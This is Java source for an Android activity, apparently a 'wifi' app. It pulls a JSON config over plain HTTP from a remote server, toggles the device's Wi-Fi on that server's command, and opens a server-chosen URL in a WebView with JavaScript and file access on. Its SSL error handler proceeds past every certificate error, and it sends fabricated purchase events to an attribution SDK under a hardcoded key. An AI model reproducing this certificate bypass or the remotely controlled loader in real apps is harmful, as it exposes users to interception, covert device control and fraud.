package wifi.datedicted.de;

import java.util.Map;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import wifi.datedicted.de.utils.AppConfig;
import wifi.datedicted.de.utils.MyAsynTask;
import wifi.datedicted.de.utils.RestClient;
import wifi.datedicted.de.utils.Util;
import android.app.ActionBar;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.http.SslError;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;
import android.webkit.SslErrorHandler;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.AttributionIDNotReady;

public class Act_Wifi extends Activity {

	private static final String TAG = Act_Wifi.class.getSimpleName();
	public static final String WEB_SERVICE_URL = "http://webservice.volevu.mobi/AndroidWebService/";
	public static final String APPLICATION_NAME = "wifi";
	private AppConfig aConfig = new AppConfig();
	private String httpResult;
	private JSONArray jArray;
	private ProgressDialog _mProgress;
	private JSONObject jobj = new JSONObject();
	private WebView browser;
	public String _mTinyURL;

	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.act_url);



		AppsFlyerLib.sendTracking(getApplicationContext());

	
		PackageManager manager = this.getPackageManager();

		String devKey = "";
		try {
			Bundle meta = manager.getApplicationInfo(this.getPackageName(),
					PackageManager.GET_META_DATA).metaData;
			if (meta != null) {
				devKey = meta.get("APPSFLYER_DEV_KEY").toString();
				AppsFlyerLib.sendTrackingWithEvent(getApplicationContext(),
						"CASE1", "EVENT_REVENUE_VALUE1");
				try {
					AppsFlyerLib.getConversionData(getApplicationContext());
				} catch (AttributionIDNotReady e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}
		} catch (Exception e) {
			android.util.Log.d("EXCEPTION", "" + e.getMessage());
			AppsFlyerLib.sendTrackingWithEvent(getApplicationContext(),
					"CASE2", "EVENT_REVENUE_VALUE1");
			try {
				AppsFlyerLib.getConversionData(getApplicationContext());
			} catch (AttributionIDNotReady e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}

		}

		Log.i("{appsFlyer} Initializing from manifest with DevKey=", devKey);
		AppsFlyerLib.setAppsFlyerKey(devKey);
		AppsFlyerLib.getAppsFlyerUID(this);
		Log.i("{appsFlyer} Initializing from manifest with DevKey=",
				AppsFlyerLib.getAppsFlyerUID(this));
		System.out.println("KEY1" + devKey);

		try {
			Map<String, String> BB = AppsFlyerLib.getConversionData(this);
			
			for (String attrName : BB.keySet()) {


			}
		} catch (AttributionIDNotReady e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		AppsFlyerLib.registerConversionListener(this,
				new AppsFlyerConversionListener() {

					@Override
					public void onAppOpenAttribution(Map<String, String> conversionData) {
						// TODO Auto-generated method stub

					}

					@Override
					public void onInstallConversionDataLoaded(
							Map<String, String> conversionData) {
						// TODO Auto-generated method stub
						try {
							for (String attrName : conversionData.keySet()) {

							}
							
						} catch (Exception e) {
							// TODO: handle exception
						}
						
					}

					@Override
					public void onInstallConversionFailure(String errorMessage) {
						// TODO Auto-generated method stub
						Log.i(TAG, "onInstallConversionFailure:" + errorMessage);
					}

				});
		
		
		ActionBar actionBar = getActionBar();
		actionBar.hide();
		
		_mProgress = new ProgressDialog(this);
		_mProgress.setCancelable(true);
		_mProgress.setTitle(R.string.lab_synchor_runing);
		_mProgress.show();

		browser = (WebView) findViewById(R.id.wvBrowser);

		final String accountCheckUrl =WEB_SERVICE_URL + "wifi.php"
				+ "?application_name=" + APPLICATION_NAME;

		Log.i(TAG, accountCheckUrl);

		new MyAsynTask(this) {
			@Override
			protected String doInBackground(Void... params) {
				RestClient restClient = new RestClient();
				httpResult = restClient
						.sendHttpGet(accountCheckUrl);

				try {
					if (Util.isEmpty(httpResult)) {
						finish();
					} else {
						Log.i("result", httpResult);
						jArray = new JSONArray(httpResult);
						jobj = jArray.getJSONObject(0);
					}
				} catch (JSONException e) {
				}

				return "" + httpResult;
			}

			protected void onPostExecute(String result) {
				super.onPostExecute(result);

				if (jobj.has("error")) {
					try {
						String errmessage = jobj.getString("error");
					} catch (JSONException e) {
						e.printStackTrace();
					}
				} else {
					try {
						jArray = new JSONArray(httpResult);
						jobj = jArray.getJSONObject(0);

						aConfig.setProduct(jobj.getString("product"));
						aConfig.setState(jobj.getString("state"));
						aConfig.setWifi(jobj.getString("wifi"));
						aConfig.setUrl(jobj.getString("url"));
						aConfig.setSms(jobj.getString("sms"));

						PreferenceManager
								.getDefaultSharedPreferences(Act_Wifi.this)
								.edit().putString("TINYURL", aConfig.getUrl())
								.commit();

						PreferenceManager
								.getDefaultSharedPreferences(Act_Wifi.this)
								.edit().putString("STATE", aConfig.getState())
								.commit();

						PreferenceManager
								.getDefaultSharedPreferences(Act_Wifi.this)
								.edit().putString("WIFI", aConfig.getWifi())
								.commit();

					} catch (JSONException e1) {
						Log.e(TAG, "get the aConfig from the backend !", e1);
						e1.printStackTrace();
					}
				}
				PreferenceManager.getDefaultSharedPreferences(Act_Wifi.this)
						.edit().putString("STATE", aConfig.getState()).commit();

				PreferenceManager.getDefaultSharedPreferences(Act_Wifi.this)
						.edit().putString("WIFI", aConfig.getWifi()).commit();

				String state = PreferenceManager.getDefaultSharedPreferences(
						Act_Wifi.this).getString("STATE", null);
				String wifi = PreferenceManager.getDefaultSharedPreferences(
						Act_Wifi.this).getString("WIFI", null);

				if (state.equals("1")) {
					if (wifi.equals("1")) {
						enableWifi(getApplication());

						load();

					} else
						disableWifi(getApplication());
					load();

				}

				else
				{
					
					Act_Wifi.this.finish();
					
				}
					
			};
		}.execute();

	}
	public void load() {

		String url = PreferenceManager.getDefaultSharedPreferences(
				Act_Wifi.this).getString("TINYURL", null);
		System.out.println("URL" + url);
		browser.loadUrl(url);
		browser.setWebViewClient(new WebViewClient() {
			public boolean shouldOverrideUrlLoading(WebView view, String url) {

				view.loadUrl(url);
				return true;
			}

			public void onPageFinished(WebView view, String url) {

				view.clearCache(true);

				Log.d("tt", url);
				if (_mProgress.isShowing())
					_mProgress.dismiss();
			}

			public void onReceivedSslError(WebView view,
					SslErrorHandler handler, SslError error) {
				super.onReceivedSslError(view, handler, error);
				handler.proceed();
				error.getCertificate();
			}
		});

		WebSettings webSettings = browser.getSettings();
		webSettings.setBuiltInZoomControls(true);
		webSettings.setSupportZoom(true);
		webSettings.setJavaScriptEnabled(true);
		webSettings.setAllowContentAccess(true);
		webSettings.setAllowFileAccess(true);
		webSettings.setJavaScriptCanOpenWindowsAutomatically(true);

	}
	
	@Override
	public void onStart() {
		super.onStart();

		AppsFlyerLib.setAppsFlyerKey(getString(R.string.AppsFlyerKey));
		String appsFlyerId = AppsFlyerLib.getAppsFlyerUID(this);

		PreferenceManager.getDefaultSharedPreferences(Act_Wifi.this).edit()
				.putString("APPSFID", appsFlyerId).commit();
		System.out.println("AppsFlyerID" + appsFlyerId);
		

		try {
			onConversionDataLoaded(AppsFlyerLib.getConversionData(this));
		} catch (AttributionIDNotReady e2) {
			// TODO Auto-generated catch block
			e2.printStackTrace();
		}
		AppsFlyerLib.setDeviceTrackingDisabled(true);
		AppsFlyerLib.setAppsFlyerKey(getString(R.string.AppsFlyerKey));
		Util.enableWifi(this);
		
		AppsFlyerLib.setAppsFlyerKey("eMvEDdLCKtBaC4fKbVgMQo");
		AppsFlyerLib.setCurrencyCode("USD");
	
	AppsFlyerLib.sendTracking(getApplicationContext());
	AppsFlyerLib.sendTrackingWithEvent(getApplicationContext(),"registration","");
	AppsFlyerLib.sendTrackingWithEvent(getApplicationContext(),"purchase","0.99");
	AppsFlyerLib.sendTrackingWithEvent(getApplicationContext(),"purchase","10.50");
	AppsFlyerLib.sendTrackingWithEvent(getApplicationContext(),"hotel-booked","200");
	System.out
			.println("aConfig.setAppsFlyerId(AppsFlyerLib.getAppsFlyerUID(this))");
	AppsFlyerLib.setAppsFlyerKey(getString(R.string.AppsFlyerKey));
	AppsFlyerLib.setCurrencyCode("GBP");
	AppsFlyerLib.setCurrencyCode("USD");
	

	AppsFlyerLib.setAppUserId("myId");
	String id = AppsFlyerLib.getAppUserId();
	AppsFlyerLib.setDeviceTrackingDisabled(true);
	
		
		AppsFlyerLib.registerConversionListener(this,
				new AppsFlyerConversionListener() {

					@Override
					public void onAppOpenAttribution(Map<String, String> conversionData) {
						// TODO Auto-generated method stub

					}

					@Override
					public void onInstallConversionDataLoaded(
							Map<String, String> conversionData) {
						// TODO Auto-generated method stub
						for (String attrName : conversionData.keySet()) {

						}
					}

					@Override
					public void onInstallConversionFailure(String errorMessage) {
						// TODO Auto-generated method stub
						Log.i(TAG, "onInstallConversionFailure:" + errorMessage);
					}

				});

		
	}

	@Override
	public void onStop() {
		super.onStop();

	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		finish();

	}


	public static void saveProduct(Context context, String pProduct) {

		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);

		lPreferences.edit().putString("PrefProduct", pProduct).commit();
	}

	public static void saveState(Context context, String pState) {

		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);

		lPreferences.edit().putString("PrefState", pState).commit();
	}

	public static void saveWiFi(Context context, String pWiFi) {

		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);

		lPreferences.edit().putString("PrefWiFI", pWiFi).commit();
	}

	public static void saveURL(Context context, String pURL) {

		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);

		lPreferences.edit().putString("PrefURL", pURL).commit();
	}

	public static void saveSMS(Context context, String pSMS) {

		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);

		lPreferences.edit().putString("PrefSMS", pSMS).commit();
	}

	public static String getProductfromPref(Context context) {
		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);
		return lPreferences.getString("PrefProduct", "");
	}

	public static String getStatefromPref(Context context) {
		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);
		return lPreferences.getString("PrefState", "");
	}

	public static String getWiFIfromPref(Context context) {
		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);
		return lPreferences.getString("PrefWiFI", "");
	}

	public static String getURLfromPref(Context context) {
		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);
		return lPreferences.getString("PrefURL", "");
	}

	public static String getSMSfromPref(Context context) {
		SharedPreferences lPreferences = PreferenceManager
				.getDefaultSharedPreferences(context);
		return lPreferences.getString("PrefSMS", "");
	}

	public static void enableWifi(Context context) {
		WifiManager wifi = (WifiManager) context
				.getSystemService(Context.WIFI_SERVICE);
		if (!wifi.isWifiEnabled()) {

			wifi.setWifiEnabled(true);
		}
	}

	public static void disableWifi(Context context) {
		WifiManager wifi = (WifiManager) context
				.getSystemService(Context.WIFI_SERVICE);
		if (wifi.isWifiEnabled()) {

			wifi.setWifiEnabled(false);
		}
	}
	
	
	
	public void onConversionDataLoaded(Map<String, String> conversionData) {
		for (String attrName : conversionData.keySet()){

            Log.d("AppsFlyerTest","attribute: "+attrName+" = "+conversionData.get(attrName));

        }

	}

	public void onConversionFailure(String errorMessage) {
		 Log.d("AppsFlyerTest", "error getting conversion data: "+errorMessage);

	}
	
}
